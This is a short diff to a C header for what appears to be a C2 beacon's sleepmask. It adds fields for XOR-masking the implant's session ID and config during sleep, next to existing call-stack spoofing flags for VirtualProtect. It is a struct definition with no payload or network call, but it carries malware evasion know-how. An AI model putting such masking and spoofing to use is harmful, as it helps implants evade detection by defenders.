@@ -68,4 +68,11 @@ typedef struct _NAX_SM_INFO {
     SIZE_T  NtdllSize;      /* ntdll SizeOfImage */
     UINT32  SpoofReady;     /* 1 = gadget+filler resolved; 0 = spoof disabled */
     UINT32  SpoofCount;     /* P4 diagnostic: incremented by the trampoline on every spoofed VP (zero-init) */
+    /* W0.7 private-region masking (populated by the beacon gate before Sleep):
+     * [PrivateBase, PrivateBase+PrivateLen) = SessionId + Config inside the
+     * instance, XOR-masked with the same per-sleep key while the beacon code
+     * span is masked.  Sleepmask reads Config BEFORE masking starts, so the
+     * range must never include this struct itself. */
+    PVOID   PrivateBase;    /* NULL = instance masking disabled */
+    UINT32  PrivateLen;
 } NAX_SM_INFO, *PNAX_SM_INFO;
